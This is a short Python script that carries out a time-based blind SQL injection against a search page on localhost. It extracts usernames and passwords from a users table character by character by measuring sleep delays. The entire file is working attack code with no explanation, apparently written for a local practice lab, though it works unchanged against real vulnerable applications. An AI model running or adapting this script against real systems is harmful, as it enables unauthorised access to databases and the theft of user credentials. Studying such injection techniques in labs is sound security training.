#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost:8081/searchUsers.php"

characters = string.printable

def makeSQLI():

    p1 = log.progress("Brute force")
    p1.status("Starting brute force process")

    time.sleep(2)

    p2 = log.progress("Extracted data")
    extracted_info=""

    for position in range(1,150):
        for character in range(33, 126):
            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)
            p1.status(f"Position: {position}, Character: {character}")
            
            time_start=time.time()
            r = requests.get(sqli_url)
            time_end=time.time()

            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':
    makeSQLI()
